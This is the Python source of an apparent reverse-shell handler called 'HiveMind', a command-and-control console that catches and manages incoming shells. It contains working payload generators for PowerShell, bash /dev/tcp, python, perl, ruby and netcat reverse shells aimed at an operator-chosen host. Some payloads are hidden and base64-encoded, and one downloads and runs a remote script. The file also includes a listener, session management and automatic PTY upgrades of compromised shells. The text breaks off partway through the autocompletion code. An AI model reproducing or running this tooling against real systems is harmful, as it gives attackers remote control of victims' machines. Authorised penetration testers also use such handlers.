#!/usr/bin/env python3
import socket
import threading
import os
import sys
import select
import subprocess
import base64
import time
try:
    import readline  # For tab autocomplete and history
except ImportError:
    readline = None

try:
    import netifaces
except ImportError:
    netifaces = None

try:
    from termcolor import colored
except ImportError:
    def colored(text, *args, **kwargs):
        return text

try:
    import pyperclip  # For copying output to clipboard
except ImportError:
    pyperclip = None

# Global default port for all reverse shells
DEFAULT_PORT = 4444
# Global heartbeat timeout (in seconds) before considering a session dead.
HEARTBEAT_TIMEOUT = 300  # 5 minutes

# Global event that will be set when the listener thread has printed its startup message.
listener_ready = threading.Event()
# Global flag to indicate if the listener is running
listener_running = False
# Global variable to hold the listener socket
listener_socket = None
# Protect listener socket/running state changes.
listener_lock = threading.Lock()
# Keep session IDs unique even if the listener is stopped and restarted.
next_session_id = 1

# --- Enhanced Payload Types ---
PAYLOAD_TYPES = [
    "windows/reverse_tcp/powershell",
    "windows/conpty",
    "linux/reverse_tcp/bash",
    "linux/reverse_tcp/python",
    "linux/reverse_tcp/perl",
    "linux/reverse_tcp/ruby",
    "cmd/unix/reverse_netcat"
]

# Command list now includes "listen" and "stop listener" among others.
COMMANDS = [
    'alias', 'cleanup', 'cmd', 'clear', 'exit', 'help',
    'kill', 'session', 'sessions', 'set payload', 'show payloads', 'upgrade', 'raw',
    'help raw', 'help upgrade', 'listen', 'stop listener'
]

# --- Global Structures for Sessions ---
class Session:
    def __init__(self, session_id, conn, addr):
        self.session_id = session_id
        self.conn = conn
        self.addr = addr
        self.last_heartbeat = time.time()  # Timestamp of last activity
        # Saved interaction state.
        # basic = original line-by-line mode.
        # raw   = byte-forwarding mode used after raw/upgrade.
        self.attach_mode = "basic"
        # True after a real Linux PTY upgrade command has been sent for this session.
        # This prevents upgrade/session from sending the PTY command repeatedly.
        self.pty_upgraded = False
        # none        = no upgrade state saved.
        # pty         = python/script created a real PTY-like shell.
        # interactive = fallback shell like /bin/sh -i, useful with raw mode but not a real PTY.
        self.upgrade_mode = "none"

# sessions: mapping session_id (int) -> Session object
sessions = {}
# session_aliases: mapping alias (str) -> session_id (int)
session_aliases = {}
lock = threading.RLock()  # For synchronizing access to sessions and aliases

# --- Helper for synchronized printing ---
print_lock = threading.Lock()
def safe_print(*args, **kwargs):
    with print_lock:
        print(*args, **kwargs)


# --- Utility Functions ---
def color(text, color_code):
    """Wraps the given text with ANSI escape codes for the provided color code."""
    return f"\033[{color_code}m{text}\033[0m"

def banner():
    # Original banner as requested.
    banner_text = color(
        """
    ██╗  ██╗██╗██╗   ██╗███████╗███╗   ███╗██╗███╗   ██╗██████╗ 
    ██║  ██║██║██║   ██║██╔════╝████╗ ████║██║████╗  ██║██╔══██╗
    ███████║██║██║   ██║█████╗  ██╔████╔██║██║██╔██╗ ██║██║  ██║
    ██╔══██║██║╚██╗ ██╔╝██╔══╝  ██║╚██╔╝██║██║██║╚██╗██║██║  ██║
    ██║  ██║██║ ╚████╔╝ ███████╗██║ ╚═╝ ██║██║██║ ╚████║██████╔╝
    ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═════╝ 
        """, "96"
    )
    safe_print(banner_text, flush=True)
    safe_print(colored("[Info]", "green"), "Reverse Shell Multi-Handler Initialized.", flush=True)
    safe_print(colored("[Info]", "green"), "Type 'help' to list available commands.\n", flush=True)

def show_help():
    safe_print(colored("\n[ HiveMind Commands ]", "yellow"), flush=True)
    safe_print(colored("  alias <id|alias> <new_alias>         - Set an alias for a session", "green"), flush=True)
    safe_print(colored("  cleanup                              - Manually clean up dead sessions", "green"), flush=True)
    safe_print(colored("  cmd <command>                        - Execute a local shell command", "green"), flush=True)
    safe_print(colored("  clear                                - Clear the screen and reprint the header", "green"), flush=True)
    safe_print(colored("  exit                                 - Exit HiveMind", "green"), flush=True)
    safe_print(colored("  help                                 - Show this help menu", "green"), flush=True)
    safe_print(colored("  help raw                             - Show manual raw attach equivalents", "green"), flush=True)
    safe_print(colored("  help upgrade                         - Show manual Linux TTY upgrade commands", "green"), flush=True)
    safe_print(colored("  kill <id|alias>                      - Kill a session", "green"), flush=True)
    safe_print(colored("  session <id|alias>                   - Interact using the session's saved mode", "green"), flush=True)
    safe_print(colored("  sessions                             - Show all active sessions", "green"), flush=True)
    safe_print(colored("  set payload <Type> <LHOST> [base64]  - Set payload (no port required)", "green"), flush=True)
    safe_print(colored("  show payloads                        - List available payloads", "green"), flush=True)
    safe_print(colored("  upgrade <id|alias>                   - Try Linux PTY upgrade, save raw mode, then attach", "green"), flush=True)
    safe_print(colored("  raw <id|alias>                       - Attach in raw mode and save raw mode for session", "green"), flush=True)
    safe_print(colored("  listen <port>                        - Start listener on specified port (default: 4444)", "green"), flush=True)
    safe_print(colored("  stop listener                        - Stop the current listener", "green"), flush=True)
    safe_print("", flush=True)

def show_raw_help():
    safe_print(colored("\n[ Help: raw ]", "yellow"), flush=True)
    safe_print(colored("  HiveMind usage:", "cyan"), flush=True)
    safe_print("    raw <id|alias>", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  What HiveMind does:", "cyan"), flush=True)
    safe_print("    * Puts your local terminal into raw byte-forwarding mode.", flush=True)
    safe_print("    * Sends no remote command to the target.", flush=True)
    safe_print("    * Press Ctrl+] to return to the HiveMind menu.", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  Manual netcat equivalent if you already caught a shell:", "cyan"), flush=True)
    safe_print("    Ctrl+Z", flush=True)
    safe_print("    stty raw -echo; fg", flush=True)
    safe_print("    # Press Enter once after it resumes", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  Better Windows ConPTY listener from the start:", "cyan"), flush=True)
    safe_print("    stty raw -echo; (stty size; cat) | nc -lvnp 4444", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  Fix your local terminal after raw mode if it gets weird:", "cyan"), flush=True)
    safe_print("    stty sane", flush=True)
    safe_print("    reset", flush=True)
    safe_print("", flush=True)


def show_upgrade_help():
    safe_print(colored("\n[ Help: upgrade ]", "yellow"), flush=True)
    safe_print(colored("  HiveMind usage:", "cyan"), flush=True)
    safe_print("    upgrade <id|alias>", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  What HiveMind does:", "cyan"), flush=True)
    safe_print("    * Sends a Linux PTY spawn command to the target.", flush=True)
    safe_print("    * Sends a terminal resize command.", flush=True)
    safe_print("    * Saves the session as raw + Linux PTY so future session <id> reuses it.", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  Manual Linux TTY upgrade commands:", "cyan"), flush=True)
    safe_print("    python3 -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")'", flush=True)
    safe_print("    python -c 'import pty,os; sh=os.environ.get(\"SHELL\") or \"/bin/bash\"; pty.spawn(sh if os.path.exists(sh) else \"/bin/sh\")'", flush=True)
    safe_print("    script -qc /bin/bash /dev/null", flush=True)
    safe_print("    /bin/sh -i", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  Manual local terminal raw step after spawning a PTY:", "cyan"), flush=True)
    safe_print("    Ctrl+Z", flush=True)
    safe_print("    stty raw -echo; fg", flush=True)
    safe_print("    # Press Enter once after it resumes", flush=True)
    safe_print("", flush=True)
    rows, cols = get_terminal_rows_cols()
    safe_print(colored("  Manual terminal settings inside the remote shell:", "cyan"), flush=True)
    safe_print(f"    # Current local terminal size detected: {rows} rows, {cols} cols", flush=True)
    safe_print("    export TERM=xterm", flush=True)
    safe_print(f"    stty rows {rows} cols {cols}", flush=True)
    safe_print("", flush=True)
    safe_print(colored("  Fix your local terminal after raw mode if it gets weird:", "cyan"), flush=True)
    safe_print("    stty sane", flush=True)
    safe_print("    reset", flush=True)
    safe_print("", flush=True)


def list_payloads():
    safe_print(colored("\n[ Available Payloads ]", "blue"), flush=True)
    safe_print(colored("  windows/reverse_tcp/powershell  - Standard PowerShell Reverse Shell", "green"), flush=True)
    safe_print(colored("  windows/conpty                  - ConPty-based Reverse Shell (use upgrade)", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/bash          - Bash Reverse Shell", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/python        - Python Reverse Shell", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/perl          - Perl Reverse Shell", "green"), flush=True)
    safe_print(colored("  linux/reverse_tcp/ruby          - Ruby Reverse Shell", "green"), flush=True)
    safe_print(colored("  cmd/unix/reverse_netcat         - Netcat Reverse Shell with random FIFO", "green"), flush=True)
    safe_print("", flush=True)

def resolve_ip(lhost):
    if netifaces is not None and lhost in netifaces.interfaces():
        addrs = netifaces.ifaddresses(lhost)
        if netifaces.AF_INET in addrs and addrs[netifaces.AF_INET]:
            return addrs[netifaces.AF_INET][0]['addr']
        safe_print(colored(f"[-] No IPv4 address found for interface {lhost}. Using input as is.", "red"), flush=True)
        return lhost

    try:
        socket.inet_aton(lhost)
        return lhost
    except socket.error:
        try:
            return socket.gethostbyname(lhost)
        except Exception as e:
            safe_print(colored(f"[-] Failed to resolve {lhost}: {e}. Using input as is.", "red"), flush=True)
            return lhost

def generate_payload(payload_type, lhost, encode=False):
    resolved_host = resolve_ip(lhost)
    
    if payload_type == "windows/conpty":
        try:
            size_output = subprocess.check_output(["stty", "size"], text=True).strip()
            rows, cols = size_output.split()
        except Exception as e:
            safe_print(colored(f"[-] Failed to obtain terminal size: {e}. Using default values.", "red"), flush=True)
            rows, cols = "24", "80"
        script_body = (
            f"IEX((New-Object Net.WebClient).DownloadString('http://{resolved_host}/Invoke-ConPtyShell.ps1')); "
            f"Invoke-ConPtyShell {resolved_host} {DEFAULT_PORT} -Rows {rows} -Cols {cols}"
        )
        if encode:
            encoded_payload = base64.b64encode(script_body.encode('utf-16le')).decode()
            return f"powershell -nop -W hidden -noni -ep bypass -e {encoded_payload}"
        else:
            payload = f"powershell -nop -W hidden -noni -ep bypass -c \"{script_body}\""
    elif payload_type == "windows/reverse_tcp/powershell":
        script_body = (
            f"$TCPClient = New-Object Net.Sockets.TCPClient('{resolved_host}', {DEFAULT_PORT});"
            f"$NetworkStream = $TCPClient.GetStream();"
            f"$StreamWriter = New-Object IO.StreamWriter($NetworkStream);"
            f"function WriteToStream ($String) "
            f"{{[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {{0}}; "
            f"$StreamWriter.Write($String + 'SHELL> '); "
            f"$StreamWriter.Flush()}}; "
            f"WriteToStream ''; "
            f"while(($BytesRead = $NetworkStream.Read($script:Buffer, 0, $script:Buffer.Length)) -gt 0) "
            f"{{ $Command = ([text.encoding]::UTF8).GetString($script:Buffer, 0, $BytesRead - 1); "
            f"if ($Command -ne '') {{ $Output = try {{ Invoke-Expression $Command 2>&1 | Out-String -Width 4096 }} catch {{ $_ | Out-String -Width 4096 }}; "
            f"WriteToStream ($Output) }} }}; "
            f"$StreamWriter.Close()"
        )
        if encode:
            encoded_payload = base64.b64encode(script_body.encode('utf-16le')).decode()
            return f"powershell -e {encoded_payload}"
        else:
            payload = f"powershell -nop -W hidden -noni -ep bypass -c \"{script_body}\""
    elif payload_type == "linux/reverse_tcp/bash":
        plain_payload = f"bash -i >& /dev/tcp/{resolved_host}/{DEFAULT_PORT} 0>&1"
        if encode:
            encoded_payload = base64.b64encode(plain_payload.encode()).decode()
            payload = f'echo "{encoded_payload}" | base64 -d | sh'
        else:
            payload = plain_payload
    elif payload_type == "linux/reverse_tcp/python":
        payload = (
            f"python -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{resolved_host}\",{DEFAULT_PORT}));"
            f"os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);"
            f"p=subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
    elif payload_type == "linux/reverse_tcp/perl":
        payload = (
            f"perl -e 'use Socket;$i=\"{resolved_host}\";$p={DEFAULT_PORT};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
            f"open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");"
            f"exec(\"/bin/sh -i\");}};'"
        )
    elif payload_type == "linux/reverse_tcp/ruby":
        payload = (
            f"ruby -rsocket -e 'f=TCPSocket.new(\"{resolved_host}\",{DEFAULT_PORT});"
            f"while(cmd=f.gets); IO.popen(cmd,\"r\"){{|io| f.print io.read}} end'"
        )
    elif payload_type == "cmd/unix/reverse_netcat":
        import random, string
        temp_fifo = "/tmp/" + "".join(random.choices(string.ascii_lowercase, k=8))
        plain_payload = f"mkfifo {temp_fifo}; nc {resolved_host} {DEFAULT_PORT} 0<{temp_fifo} | /bin/sh >{temp_fifo} 2>&1; rm {temp_fifo}"
        if encode:
            encoded_payload = base64.b64encode(plain_payload.encode()).decode()
            payload = f'echo "{encoded_payload}" | base64 -d | sh'
        else:
            payload = plain_payload
    else:
        return "Invalid payload type."
    
    return payload

# --- Networking Functions ---
def start_listener(port):
    """
    Listens on the given port and records a new session for each incoming connection.
    The loop exits cleanly when stop_listener() closes the listener socket.
    """
    global listener_socket, listener_running, next_session_id

    listener_ready.clear()
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.settimeout(1.0)

    try:
        server.bind(("0.0.0.0", port))
        server.listen(10)
    except Exception as e:
        safe_print(colored(f"[-] Failed to start listener on port {port}: {e}", "red"), flush=True)
        try:
            server.close()
        except Exception:
            pass
        with listener_lock:
            listener_socket = None
            listener_running = False
        return

    with listener_lock:
        listener_socket = server
        listener_running = True

    safe_print(colored(f"[+] HiveMind is listening for incoming shells on port {port}...\n", "yellow"), flush=True)
    listener_ready.set()

    while listener_running:
        try:
            conn, addr = server.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        except Exception as e:
            safe_print(colored(f"[-] Listener error: {e}", "red"), flush=True)
            break

        with lock:
            session_id = next_session_id
            next_session_id += 1
            session_obj = Session(session_id, conn, addr)
            sessions[session_id] = session_obj

        safe_print(colored(f"[+] Session {session_id} established from {addr}", "green"), flush=True)
        # Do not start a background reader here. Reading from the socket outside
        # interactive_shell() can accidentally consume shell output before the
        # user enters the session.

    try:
        server.close()
    except Exception:
        pass

    with listener_lock:
        if listener_socket is server:
            listener_socket = None
        listener_running = False
    listener_ready.clear()

def stop_listener():
    """
    Stops the listener by closing the listener socket.
    """
    global listener_socket, listener_running

    with listener_lock:
        sock = listener_socket
        if sock is None:
            safe_print(colored("[-] No listener is currently running.", "red"), flush=True)
            return
        listener_socket = None
        listener_running = False
        listener_ready.clear()

    try:
        sock.shutdown(socket.SHUT_RDWR)
    except OSError:
        pass
    except Exception:
        pass

    try:
        sock.close()
    except Exception:
        pass

    safe_print(colored("[*] Listener stopped.", "yellow"), flush=True)

def remove_session(session_id):
    """Helper function to remove a session and its alias (if any)."""
    with lock:
        if session_id in sessions:
            try:
                sessions[session_id].conn.close()
            except Exception:
                pass
            del sessions[session_id]
        for alias, sid in list(session_aliases.items()):
            if sid == session_id:
                del session_aliases[alias]

def resolve_session_identifier(identifier):
    """
    Resolves an identifier (numeric string or alias) to a session id.
    Returns an integer session id if found, otherwise None.
    """
    with lock:
        if identifier.isdigit():
            sid = int(identifier)
            if sid in sessions:
                return sid
        elif identifier in session_aliases:
            sid = session_aliases[identifier]
            if sid in sessions:
                return sid
            else:
                del session_aliases[identifier]
    return None

def kill_session(identifier):
    """Kills a session by id or alias."""
    sid = resolve_session_identifier(identifier)
    if sid is None:
        safe_print(colored(f"[-] No active session matching '{identifier}'.", "red"), flush=True)
    else:
        remove_session(sid)
        safe_print(colored(f"[*] Session {sid} has been terminated.", "yellow"), flush=True)

# This function currently serves as a placeholder for any background handling.
def handle_client(conn, addr):
    pass

# --- Session Handling Functions ---
def interactive_shell(session_id):
    with lock:
        if session_id not in sessions:
            safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
            return
        session = sessions[session_id]
        attach_mode = getattr(session, "attach_mode", "basic")
        pty_upgraded = getattr(session, "pty_upgraded", False)
        upgrade_mode = getattr(session, "upgrade_mode", "pty" if pty_upgraded else "none")

    if attach_mode == "raw":
        if upgrade_mode == "pty" or pty_upgraded:
            mode_label = "raw + Linux PTY"
        elif upgrade_mode == "interactive":
            mode_label = "raw + interactive shell"
        else:
            mode_label = "raw"
        safe_print(colored(f"[*] Session {session_id} is saved as {mode_label}. Using raw attach.", "yellow"), flush=True)
        raw_attach_session(session_id, auto_pty=False, remember=False)
        return

    safe_print(colored(f"\n[*] Switched to session {session_id}. Press Ctrl+C to return to HiveMind menu.\n", "yellow"), flush=True)
    try:
        while True:
            r, _, _ = select.select([session.conn, sys.stdin], [], [])
            if session.conn in r:
                try:
                    data = session.conn.recv(4096)
                except Exception as e:
                    safe_print(colored(f"[-] Error receiving data: {e}", "red"), flush=True)
                    remove_session(session_id)
                    break
                if not data:
                    safe_print(colored("[-] Connection closed by remote host.", "red"), flush=True)
                    remove_session(session_id)
                    break
                session.last_heartbeat = time.time()
                safe_print(data.decode(errors="ignore"), end="", flush=True)
            if sys.stdin in r:
                cmd = input(colored("", "cyan"))
                try:
                    session.conn.send((cmd + "\n").encode())
                except Exception as e:
                    safe_print(colored(f"[-] Error sending data: {e}", "red"), flush=True)
                    break
    except KeyboardInterrupt:
        safe_print(colored("\n[*] Returning to HiveMind menu...\n", "yellow"), flush=True)
    except Exception as e:
        safe_print(colored(f"[-] Session {session_id} lost: {e}", "red"), flush=True)
        remove_session(session_id)

def get_terminal_rows_cols():
    """Return local terminal size as (rows, cols), with safe defaults."""
    try:
        size = os.get_terminal_size(sys.stdin.fileno())
        return size.lines, size.columns
    except Exception:
        return 24, 80


def drain_session_output(session, timeout=0.35, print_output=True):
    """Drain any data currently waiting on a session socket.
    Set print_output=False when setup commands should stay quiet.
    """
    end_time = time.time() + timeout
    got_data = False
    while time.time() < end_time:
        try:
            r, _, _ = select.select([session.conn], [], [], 0.05)
        except Exception:
            return got_data
        if not r:
            continue
        try:
            data = session.conn.recv(4096)
        except BlockingIOError:
            continue
        except Exception:
            return got_data
        if not data:
            return got_data
        got_data = True
        session.last_heartbeat = time.time()
        if print_output:
            safe_print(data.decode(errors="ignore"), end="", flush=True)
    return got_data



def capture_session_output(session, timeout=1.0, stop_marker=None):
    """Capture data waiting on a session socket without printing it."""
    end_time = time.time() + timeout
    buffer = b""
    stop_bytes = stop_marker.encode() if stop_marker else None

    while time.time() < end_time:
        try:
            r, _, _ = select.select([session.conn], [], [], 0.05)
        except Exception:
            break
        if not r:
            continue
        try:
            data = session.conn.recv(4096)
        except BlockingIOError:
            continue
        except Exception:
            break
        if not data:
            break
        buffer += data
        session.last_heartbeat = time.time()
        if stop_bytes and stop_bytes in buffer:
            break

    return buffer.decode(errors="ignore")


def extract_marker_body(output, start_marker, end_marker):
    """Return text between the last matching start/end markers.

    Reverse shells often echo the command we send, so markers may appear in the
    echoed command before the real command output. Using the last marker pair
    avoids parsing the echoed command line as probe output.
    """
    end_index = output.rfind(end_marker)
    if end_index == -1:
        return ""
    start_index = output.rfind(start_marker, 0, end_index)
    if start_index == -1:
        return ""
    start_index += len(start_marker)
    return output[start_index:end_index]


def probe_linux_upgrade_tools(session):
    """Probe the target for common Linux shell-upgrade tools."""
    marker_id = f"{os.getpid()}_{int(time.time() * 1000)}"
    start_marker = f"__HM_UPGRADE_START_{marker_id}__"
    end_marker = f"__HM_UPGRADE_END_{marker_id}__"
    probe_cmd = (
        f"printf '{start_marker}\\n'; "
        "printf 'PYTHON3=%s\\n' \"$(command -v python3 2>/dev/null)\"; "
        "printf 'PYTHON=%s\\n' \"$(command -v python 2>/dev/null)\"; "
        "printf 'SCRIPT=%s\\n' \"$(command -v script 2>/dev/null)\"; "
        "printf 'BASH=%s\\n' \"$(command -v bash 2>/dev/null)\"; "
        "printf 'SH=%s\\n' \"$(command -v sh 2>/dev/null)\"; "
        f"printf '{end_marker}\\n'\n"
    )

    try:
        session.conn.send(probe_cmd.encode())
    except Exception as e:
        safe_print(colored(f"[-] Failed to probe upgrade tools: {e}", "red"), flush=True)
        return {}

    output = capture_session_output(session, timeout=1.2, stop_marker=end_marker)
    body = extract_marker_body(output, start_marker, end_marker)
    tools = {}

    for line in body.splitlines():
        line = line.strip()
        if "=" not in line:
            continue
        key, value = line.split("=", 1)
        tools[key.strip()] = value.strip()

    return tools


def choose_linux_upgrade_command(tools):
    """Choose the best available Linux upgrade command from probe results.

    Returns (command, description, upgrade_mode).
    upgrade_mode is:
      pty         -> python/script should create a real PTY-like shell.
      interactive -> /bin/sh -i or /bin/bash -i fallback; useful with raw mode, but `tty` may still say not a tty.
    """
    python_path = tools.get("PYTHON3") or tools.get("PYTHON")
    script_path = tools.get("SCRIPT")
    shell_path = tools.get("BASH") or tools.get("SH") or "/bin/sh"

    if python_path:
        command = f"export TERM=xterm; {python_path} -c 'import pty; pty.spawn(\"{shell_path}\")'\n"
        description = f"Python PTY using {python_path} with {shell_path}"
        return command, description, "pty"

    if script_path:
        command = f"export TERM=xterm; {script_path} -qc {shell_path} /dev/null\n"
        description = f"script PTY using {script_path} with {shell_path}"
        return command, description, "pty"

    command = f"export TERM=xterm; {shell_path} -i\n"
    description = f"fallback interactive shell using {shell_path}"
    return command, description, "interactive"

def try_linux_pty_upgrade(session):
    """
    Probe a Linux/Unix target for available upgrade tools, choose the best one,
    then attach in raw mode. This avoids blindly sending every fallback command.

    Returns the selected upgrade mode:
      pty         -> real PTY-like method, such as python pty.spawn or script.
      interactive -> fallback shell, such as /bin/sh -i, saved with raw mode because that workflow is useful.
      none        -> failed to send the upgrade command.
    """
    rows, cols = get_terminal_rows_cols()
    tools = probe_linux_upgrade_tools(session)
    pty_cmd, upgrade_description, upgrade_mode = choose_linux_upgrade_command(tools)
    resize_cmd = f"stty rows {rows} cols {cols}; export TERM=xterm\n"

    safe_print(colored(f"[*] Upgrade method selected: {upgrade_description}", "yellow"), flush=True)
    if upgrade_mode == "interactive":
        safe_print(colored("[*] This fallback may still show `not a tty`, but it will be saved with raw mode because it is usable after the local raw step.", "yellow"), flush=True)

    try:
        session.conn.send(pty_cmd.encode())
        time.sleep(0.35)
        drain_session_output(session, timeout=0.25, print_output=False)
        session.conn.send(resize_cmd.encode())
        time.sleep(0.15)
        drain_session_output(session, timeout=0.20, print_output=False)
        return upgrade_mode
    except Exception as e:
        safe_print(colored(f"[-] PTY upgrade command failed to send: {e}", "red"), flush=True)
        return "none"


def raw_attach_session(session_id, auto_pty=False, remember=True):
    """
    Attach to a session in raw byte-forwarding mode.
    auto_pty=True first tries to spawn a remote Linux PTY.
    remember=True saves this session so future `session <id>` uses raw mode.
    """
    with lock:
        if session_id not in sessions:
            safe_print(colored(f"[-] No active session {session_id}", "red"), flush=True)
            return
        session = sessions[session_id]
        already_pty_upgraded = getattr(session, "pty_upgraded", False)
        existing_upgrade_mode = getattr(session, "upgrade_mode", "pty" if already_pty_upgraded else "none")

    selected_upgrade_mode = existing_upgrade_mode

    if auto_pty:
        if existing_upgrade_mode in ("pty", "interactive"):
            saved_label = "Linux PTY" if existing_upgrade_mode == "pty" else "interactive shell"
            safe_print(colored(f"[*] Session {session_id} is already marked as upgraded with {saved_label}. Skipping upgrade command.", "yellow"), flush=True)
        else:
            selected_upgrade_mode = try_linux_pty_upgrade(session)
            if selected_upgrade_mode == "none":
                return
            with lock:
                if session_id in sessions:
                    sessions[session_id].upgrade_mode = selected_upgrade_mode
                    sessions[session_id].pty_upgraded = selected_upgrade_mode == "pty"

    try:
        import tty, termios
    except ImportError:
        safe_print(colored("[-] Raw mode requires tty/termios, which are not available on this platform.", "red"), flush=True)
        return

    try:
        old_tty = termios.tcgetattr(sys.stdin)
    except Exception as e:
        safe_print(colored(f"[-] Could not read local terminal settings: {e}", "red"), flush=True)
        return

    if remember:
        with lock:
            if session_id in sessions:
                sessions[session_id].attach_mode = "raw"
                if auto_pty:
                    sessions[session_id].upgrade_mode = selected_upgrade_mode
                    sessions[session_id].pty_upgraded = selected_upgrade_mode == "pty"
        if auto_pty and selected_upgrade_mode == "pty":
            saved_label = "raw + Linux PTY"
        elif auto_pty and selected_upgrade_mode == "interactive":
            saved_label = "raw + interactive shell"
        elif existing_upgrade_mode == "pty" or already_pty_upgraded:
            saved_label = "raw + Linux PTY"
        elif existing_upgrade_mode == "interactive":
            saved_label = "raw + interactive shell"
        else:
            saved_label = "raw"
        safe_print(colored(f"[*] Session {session_id} saved as {saved_label}. Future `session {session_id}` will reuse it.", "green"), flush=True)

    use_local_raw = not (selected_upgrade_mode == "interactive" or existing_upgrade_mode == "interactive")

    safe_print(colored(f"\n[*] Raw attach to session {session_id}. Press Ctrl+] to return to HiveMind menu.", "yellow"), flush=True)
    safe_print(colored("[*] If the screen looks blank, press Enter once or type a command like: id", "yellow"), flush=True)
    if not use_local_raw:
        safe_print(colored("[*] Interactive fallback detected. Skipping local tty.setraw() so typing stays visible.", "yellow"), flush=True)

    try:
        if use_local_raw:
            tty.setraw(sys.stdin.fileno())

        # Raw mode can look like it "kicked you out" because the last prompt may
        # have been printed before the local terminal switched to raw mode. Send one
        # harmless newline to wake the remote prompt after attaching. This is also
        # what makes future `session <id>` feel re-attached after a saved raw/PTTY
        # session.
        try:
            session.conn.send(b"\n")
        except Exception:
            pass

        while True:
            r, _, _ = select.select([session.conn, sys.stdin], [], [], 0.1)
            if session.conn in r:
                try:
                    data = session.conn.recv(4096)
                except Exception as e:
                    if use_local_raw:
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                    safe_print(colored(f"\n[-] Error receiving data: {e}", "red"), flush=True)
                    remove_session(session_id)
                    return
                if not data:
                    if use_local_raw:
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                    safe_print(colored("\n[-] Connection closed by remote host.", "red"), flush=True)
                    remove_session(session_id)
                    return
                os.write(sys.stdout.fileno(), data)
                session.last_heartbeat = time.time()

            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                if b'\x1d' in data:  # Ctrl+]
                    break
                try:
                    session.conn.send(data)
                except Exception as e:
                    if use_local_raw:
                        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
                    safe_print(colored(f"\n[-] Error sending data: {e}", "red"), flush=True)
                    return
    except KeyboardInterrupt:
        # Ctrl+C is forwarded in raw mode. This only catches local interruptions that escape raw mode.
        pass
    except Exception as e:
        safe_print(colored(f"\n[-] Raw attach failed: {e}", "red"), flush=True)
    finally:
        if use_local_raw:
            try:
                termios.tcsetattr(sys.stdin, termios.TCSADRAIN, old_tty)
            except Exception:
                pass
        safe_print(colored(f"\n[*] Returned from session {session_id}.", "yellow"), flush=True)


def upgrade_session(session_id):
    """Try a Linux PTY upgrade once, save raw mode, then attach."""
    safe_print(colored(f"[*] Attempting to upgrade Session {session_id}...", "yellow"), flush=True)
    raw_attach_session(session_id, auto_pty=True, remember=True)

def list_sessions():
    safe_print(colored("\n[ Active Sessions ]", "blue"), flush=True)
    with lock:
        if not sessions:
            safe_print(colored("[-] No active sessions.", "red"), flush=True)
        else:
            for sid, session in sessions.items():
                try:
                    peer = session.addr
                    alias_str = ""
                    for alias, asid in session_aliases.items():
                        if asid == sid:
                            alias_str = f" (alias: {alias})"
                            break
                    attach_mode = getattr(session, "attach_mode", "basic")
                    pty_upgraded = getattr(session, "pty_upgraded", False)
                    upgrade_mode = getattr(session, "upgrade_mode", "pty" if pty_upgraded else "none")
                    if attach_mode == "raw" and (upgrade_mode == "pty" or pty_upgraded):
                        mode_label = "raw+pty"
                    elif attach_mode == "raw" and upgrade_mode == "interactive":
                        mode_label = "raw+interactive"
                    else:
                        mode_label = attach_mode
                    safe_print(colored(f"Session {sid}{alias_str}: {peer[0]}:{peer[1]} [mode: {mode_label}]", "green"), flush=True)
                except Exception:
                    safe_print(colored(f"Session {sid}: [Disconnected]", "red"), flush=True)
    safe_print("", flush=True)

def cleanup_sessions():
    """Manually removes any sessions that have timed out."""
    now = time.time()
    with lock:
        stale_session_ids = [
            sid for sid, session in sessions.items()
            if now - session.last_heartbeat > HEARTBEAT_TIMEOUT
        ]

    for sid in stale_session_ids:
        remove_session(sid)

    if stale_session_ids:
        safe_print(colored(f"[*] Cleanup: Removed {len(stale_session_ids)} dead session(s).", "yellow"), flush=True)
    else:
        safe_print(colored("[*] Cleanup: No timed-out sessions found.", "yellow"), flush=True)

# --- Enhanced Autocompletion ---
def completer(text, state):
    """
    Custom completer function.
    For the "set payload" command, it offers specific completions.
    For commands like "session", "kill", "upgrade", and "alias", it dynamically completes with active session IDs and aliases.
    Otherwise, it completes from the COMMANDS list.
    """
    buffer = readline.get_line_buffer()
    tokens = buffer.split()
    if buffer.endswith(" "):
        current_token_index = len(tokens)
    else:
        current_token_index = len(tokens) - 1

    if tokens and tokens[0].lower() == "help":
        if current_token_index == 1:
            options = [topic for topic in ["raw", "upgrade"] if topic.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        return None
    elif tokens and tokens[0].lower() == "set" and len(tokens) >= 2 and tokens[1].lower() == "payload":
        if current_token_index == 2:
            options = [p for p in PAYLOAD_TYPES if p.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        elif current_token_index == 3:
            interfaces = netifaces.interfaces() if netifaces is not None else []
            options = [iface for iface in interfaces if iface.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        elif current_token_index == 4:
            ENCODING_OPTIONS = ["base64"]
            options = [opt for opt in ENCODING_OPTIONS if opt.startswith(text)]
            if state < len(options):
                return options[state]
            return None
        else:
